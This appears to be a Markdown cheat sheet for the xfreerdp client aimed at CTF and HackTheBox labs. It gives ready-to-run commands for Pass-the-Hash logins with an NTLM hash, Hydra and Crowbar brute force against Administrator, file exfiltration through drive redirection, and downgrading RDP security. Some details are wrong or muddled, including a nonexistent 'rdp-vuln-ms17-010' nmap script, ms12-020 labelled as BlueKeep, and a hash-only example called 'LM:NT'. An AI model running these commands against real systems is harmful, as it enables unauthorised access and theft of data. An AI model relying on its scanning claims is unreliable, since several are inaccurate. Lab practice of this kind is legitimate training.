> **xfreerdp** is the open-source X11 RDP (Remote Desktop Protocol) client from the FreeRDP project. It connects to Windows hosts on **port 3389** and is the go-to tool for CTF/HTB when you need GUI access, lateral movement via Pass-the-Hash, or file exfiltration via drive redirection.

---

## Quickstart — Basic Connection

```bash
# Interactive (prompts for password — safest)
$ xfreerdp /v:10.129.1.10 /u:Administrator

# With password inline (⚠️ appears in shell history)
$ xfreerdp /v:10.129.1.10 /u:Administrator /p:Password123

# Ignore self-signed certificate warnings (CTF essential)
$ xfreerdp /v:10.129.1.10 /u:Administrator /p:Password123 /cert-ignore

# Fullscreen mode
$ xfreerdp /v:10.129.1.10 /u:Administrator /p:Password123 /cert-ignore /f

# POSIX-style flags (xfreerdp3 / FreeRDP ≥ 3.0)
$ xfreerdp /v:10.129.1.10 /u:Administrator /p:Password123 /cert:ignore /f
```

**To exit fullscreen:** `Ctrl+Alt+Enter`

### ✅ Before starting — essential checks
```bash
$ nmap -sCV -p3389 10.129.1.10
# Look for "Remote Desktop Protocol" in the output
# Note the NLA status — determines whether you can use /pth or not
```

---

## Core Options / Flags

| Flag | What it does |
| :--- | :----------- |
| `/v:<host>[:port]` | Target IP/hostname (default port 3389) |
| `/u:<user>` | Username |
| `/p:<pass>` | Password (⚠️ saved in `.bash_history`) |
| `/cert-ignore` or `/cert:ignore` | Ignore certificate warnings (self-signed certs) |
| `/f` | Fullscreen mode |
| `/size:<WxH>` | Fixed window size (e.g., `/size:1280x720`) |
| `/dynamic-resolution` | Auto-resize remote desktop when window changes |
| `/multimon` | Span across all local monitors |
| `/admin` | Restricted Admin Mode (prevents creds in remote memory) |
| `/pth:<NTLM hash>` | **Pass-the-Hash** — authenticate with NTLM hash only |
| `+clipboard` | Bidirectional clipboard sync |
| `+drives` | Redirect all local drives to the remote session |
| `/drive:<name>,<path>` | Mount a specific local folder as a remote drive |
| `+fonts` | Smooth font rendering |
| `/audio-mode:<mode>` | Audio mode: `redirect`, `server`, `none` |
| `/gateway:g:<host>,u:<user>,p:<pass>` | Connect via RD Gateway |
| `/sec:<proto>` | Force security protocol: `rdp`, `tls`, `nla`, `ext` |
| `/log-level:<level>` | Debug verbosity: `OFF`, `FATAL`, `ERROR`, `WARN`, `INFO`, `DEBUG`, `TRACE` |
| `/smart-sizing` | Scale remote desktop to fit local window |
| `/network:<type>` | Network type: `auto`, `modem`, `broadband`, `lan` |
| `/timeout:<ms>` | Connection timeout in milliseconds |
| `/version` | Print version |
| `/help` | Show all available options |

---

## Useful Nmap Scripts

```bash
# Detect RDP service + info
nmap -sV -p3389 10.129.1.10

# Check if NLA is enabled (required for enumeration)
nmap --script rdp-enum-encryption -p3389 10.129.1.10

# Enumerate RDP security settings
nmap --script rdp-ntlm-info -p3389 10.129.1.10

# Check for RDP vulnerability to BlueKeep
nmap --script rdp-vuln-ms12-020 -p3389 10.129.1.10
nmap --script rdp-vuln-ms17-010 -p3389 10.129.1.10

# Check for CVE-2019-0708 (BlueKeep)
nmap --script rdp-cve-2019-0708 -p3389 10.129.1.10
```

---

## CTF / HTB Techniques

### Pass-the-Hash (PtH)

Authenticate with an NTLM hash instead of a plaintext password. Requires **Restricted Admin Mode** support (Windows ≥ 8.1 / Server 2012 R2).

```bash
# Pass-the-hash with Restricted Admin Mode
$ xfreerdp /v:10.129.1.10 /u:Administrator /pth:aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d03ae17 /cert-ignore +clipboard

# Hash-only format (LM:NT)
$ xfreerdp /v:10.129.1.10 /u:Administrator /pth:5fbc3d5fec8206a30f4b6c473d03ae17 /cert-ignore
```

> ⚠️ **Restricted Admin Mode** (`/admin`) prevents credentials from being stored in the remote machine's memory. It's often required for `/pth` to work.

```bash
# PtH + Restricted Admin
$ xfreerdp /v:10.129.1.10 /u:Administrator /pth:<NTLM-hash> /admin /cert-ignore
```

### File Exfiltration via Drive Redirection

Mount a local directory inside the RDP session to copy files back to your attacker machine.

```bash
# Mount local /tmp as drive "Data" on the Windows machine
$ xfreerdp /v:10.129.1.10 /u:Administrator /p:Password123 /drive:Data,/tmp /cert-ignore

# Redirect ALL local drives
$ xfreerdp /v:10.129.1.10 /u:Administrator /p:Password123 +drives /cert-ignore
```

Once connected, the drive appears under **This PC → Redirected drives and folders**. Copy `flag.txt` from the desktop to `\\tsclient\Data\`.

### Security Protocol Downgrade

Force an older, weaker RDP security layer to bypass negotiation issues or test for misconfigurations.

```bash
# Force RDP security (insecure — plaintext, no TLS)
$ xfreerdp /v:10.129.1.10 /u:Administrator /p:Password123 /sec:rdp

# Force TLS
$ xfreerdp /v:10.129.1.10 /u:Administrator /p:Password123 /sec:tls

# Force NLA (Network Level Authentication)
$ xfreerdp /v:10.129.1.10 /u:Administrator /p:Password123 /sec:nla
```

> ℹ️ **NLA** requires authentication before the RDP session is established. If NLA is enforced server-side, you must provide credentials upfront — PtH may not work unless the target supports Restricted Admin Mode.

### Full CTF Session Command

```bash
# All-in-one: fullscreen, clipboard, hash auth, cert-ignore
$ xfreerdp /v:10.129.1.10 /u:Administrator /pth:<hash> /admin /f +clipboard /cert-ignore /dynamic-resolution +fonts /drive:exfil,/tmp
```

---

## Debugging & Troubleshooting

```bash
# Enable full debug logging
$ xfreerdp /v:10.129.1.10 /u:Administrator /p:Password123 /log-level:DEBUG

# Check your FreeRDP version
$ xfreerdp /version

# Test connectivity to port 3389
$ nc -zv 10.129.1.10 3389

# Check if NLA is required by probing
$ nmap -p3389 --script rdp-enum-encryption 10.129.1.10
```

---

## Common Errors — What You'll Actually See

| Error / Symptom | Likely Cause |
| :-------------- | :----------- |
| `ERRCONNECT_CONNECT_FAILED` | Port 3389 not open / host unreachable |
| `ERRCONNECT_AUTHENTICATION_FAILED` | Wrong credentials or NLA mismatch |
| `ERRCONNECT_LOGON_FAILURE` | Bad username/password |
| `ERRCONNECT_TLS_CONNECT_FAILED` | TLS negotiation failed (try `/cert-ignore` or `/sec:rdp`) |
| `SSL certificate problem` | Self-signed cert — use `/cert-ignore` |
| `Account restricted` | Target requires `/admin` for PtH or policies prevent RDP login |
| `protocol security negotiation failure` | Security protocol mismatch — try `/sec:rdp` |
| `Unable to authenticate using NLA` | NLA requires valid credentials; `/pth` may not work |

---

## Automation & One-liners

### RDP brute force with Crowbar

```bash
crowbar -b rdp -s 10.129.1.10/32 -u Administrator -C /usr/share/wordlists/rockyou.txt
```

### RDP brute force with Hydra

```bash
hydra -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://10.129.1.10
```

### Check RDP accessibility in a loop

```bash
for ip in $(cat targets.txt); do
  nc -zv -w 3 $ip 3389 2>&1 && echo "$ip — RDP OPEN"
done
```

### Launch xfreerdp from a saved config (FreeRDP ≥ 3.0)

```bash
# Save your settings in an .rdp file
$ cat > box.rdp <<EOF
full address:s:10.129.1.10
username:s:Administrator
ignore certificate:s:true
enable-clipboard:i:1
EOF

# Launch from .rdp file
$ xfreerdp box.rdp
```

---

## FreeRDP 2.x vs 3.x Notes

- **FreeRDP 3.x** ships as `xfreerdp3` on many distros (Arch, Debian testing) — check with `which xfreerdp3`
- Most `xfreerdp` flags are backward-compatible with `xfreerdp3`
- In 3.x, prefer POSIX flags (`--user`, `--pass`, `/cert:ignore`) over Windows-style (`/u:`, `/p:`, `/cert-ignore`)
- 3.x supports importing `.rdp` files directly
- Use `/log-level:DEBUG` liberally when things don't work — the output is verbose but invaluable

---

## References

- [FreeRDP Official GitHub](https://github.com/FreeRDP/FreeRDP)
- [FreeRDP Wiki — Command Line Interface](https://github.com/FreeRDP/FreeRDP/wiki/CommandLineInterface)
- [HackTricks — 3389 RDP Pentesting](https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp)
- [The Hacker Recipes — Pass-the-Hash (RDP)](https://www.thehacker.recipes/ad/movement/ntlm/pth)
- [Crowbar — RDP brute forcing](https://github.com/galkan/crowbar)
- [Nmap NSE — rdp-* scripts](https://nmap.org/nsedoc/scripts/rdp-vuln-ms12-020.html)
